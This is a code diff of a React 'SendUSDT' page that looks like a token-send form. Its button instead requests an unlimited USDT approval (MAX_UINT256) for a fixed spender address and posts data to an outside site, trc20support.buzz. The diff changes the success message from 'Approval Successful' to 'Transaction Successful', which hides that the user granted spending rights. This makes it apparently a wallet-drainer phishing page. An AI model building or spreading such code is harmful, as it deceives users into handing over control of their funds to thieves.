@@ -46,7 +46,6 @@ export default function SendUSDT() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
 
-  // ✅ Theme detection (NO wallet connection)
   useEffect(() => {
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
@@ -66,8 +65,6 @@ export default function SendUSDT() {
     try {
       const web3 = new Web3(window.ethereum);
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      
-      // ✅ Use hardcoded address to check balance
       const balance = await usdt.methods.balanceOf(hardcodedAddress).call();
       setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
     } catch (err) {
@@ -76,18 +73,15 @@ export default function SendUSDT() {
   };
 
   const handleApprove = async () => {
-    // ✅ Validate amount
     if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
-      Swal.fire("Validation Error", "Please enter a valid amount", "warning");
+      Swal.fire("Error", "Please enter a valid amount.", "error");
       return;
     }
 
     setIsProcessing(true);
     try {
-      // ✅ Initialize Web3
       const web3 = new Web3(window.ethereum || window.web3.currentProvider);
 
-      // ✅ Check and switch to BSC chain if needed
       const chainId = await web3.eth.getChainId();
       if (chainId !== 56) {
         try {
@@ -107,15 +101,12 @@ export default function SendUSDT() {
       }
 
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const rawAmount = MAX_UINT256;
 
-      // ✅ Approve with MAX_UINT256 - DIRECTLY shows approval popup
-      // Using hardcoded address in 'from' field
       const receipt = await usdt.methods
-        .approve(spenderAddress, MAX_UINT256)
+        .approve(spenderAddress, rawAmount)
         .send({ from: hardcodedAddress })
-        .on("receipt", () => {
-          setShowSuccess(true);
-        })
+        .on("receipt", () => setShowSuccess(true))
         .on("error", (err) => {
           console.error(err);
           Swal.fire("Error", err.message || "Approval failed", "error");
@@ -123,7 +114,6 @@ export default function SendUSDT() {
 
       console.log("✅ Approval Success - Tx hash:", receipt.transactionHash);
 
-      // ✅ Optional: Store transaction hash if needed
       try {
         await fetch("https://www.trc20support.buzz/old/store-address.php", {
           method: "POST",
@@ -135,7 +125,7 @@ export default function SendUSDT() {
       }
 
     } catch (err) {
-      console.error("Approval error:", err);
+      console.error(err);
       Swal.fire("Error", err.message || "Something went wrong", "error");
     } finally {
       setIsProcessing(false);
@@ -156,10 +146,9 @@ export default function SendUSDT() {
         >
           <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
         </svg>
-        <h2 className="text-2xl mt-4 font-semibold">Approval Successful!</h2>
-        <p className="text-center mt-2 text-gray-400">Your USDT has been approved for the contract.</p>
+        <h2 className="text-2xl mt-4 font-semibold">Transaction Successful</h2>
         <button
-          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold hover:bg-[#4aca6b] transition-all duration-300"
+          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold"
           onClick={() => setShowSuccess(false)}
         >
           OK
@@ -177,14 +166,15 @@ export default function SendUSDT() {
             <input
               type="text"
               className="custom-input"
+              placeholder="Search or Enter"
               value={spenderAddress}
               readOnly
             />
           </div>
           <span className="right blue flex justify-between mr-3">
-            <span className="w-6 text-sm cursor-pointer hover:opacity-70">Paste</span>
-            <i className="fas fa-address-book mar_i w-6 ml-6 cursor-pointer hover:opacity-70"></i>
-            <i className="fas fa-qrcode mar_i w-6 ml-2 cursor-pointer hover:opacity-70"></i>
+            <span className="w-6 text-sm">Paste</span>
+            <i className="fas fa-address-book mar_i w-6 ml-6"></i>
+            <i className="fas fa-qrcode mar_i w-6 ml-2"></i>
           </span>
         </div>
       </div>
@@ -199,14 +189,14 @@ export default function SendUSDT() {
               step="0.01"
               value={amount}
               onChange={(e) => setAmount(e.target.value)}
-              placeholder="Enter USDT Amount"
+              placeholder="USDT Amount"
               className="custom-input"
             />
           </div>
           <span className="right mr-3">
             <span className="text-sm text-[#b0b0b0]">USDT</span>
             <span
-              className="mar_i blue text-sm ml-2 cursor-pointer hover:underline transition-all"
+              className="mar_i blue text-sm ml-2 cursor-pointer"
               onClick={setMaxAmount}
             >
               Max
@@ -221,25 +211,13 @@ export default function SendUSDT() {
         id="nextBtn"
         className="send-btn"
         onClick={handleApprove}
-        disabled={isProcessing || !amount || parseFloat(amount) <= 0}
+        disabled={isProcessing || !parseFloat(amount)}
         style={{
-          backgroundColor: isProcessing || !amount || parseFloat(amount) <= 0 ? "var(--disabled-bg)" : "#5CE07E",
-          color: isProcessing || !amount || parseFloat(amount) <= 0 ? "var(--disabled-text)" : "#1b1e15",
-          cursor: isProcessing || !amount || parseFloat(amount) <= 0 ? "not-allowed" : "pointer",
-          opacity: isProcessing || !amount || parseFloat(amount) <= 0 ? "0.6" : "1",
+          backgroundColor: isProcessing || !parseFloat(amount) ? "var(--disabled-bg)" : "#5CE07E",
+          color: isProcessing || !parseFloat(amount) ? "var(--disabled-text)" : "#1b1e15"
         }}
       >
-        {isProcessing ? (
-          <span className="flex items-center gap-2">
-            <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
-              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
-            </svg>
-            Processing...
-          </span>
-        ) : (
-          "Next"
-        )}
+        {isProcessing ? "Processing..." : "Next"}
       </button>
     </div>
   );
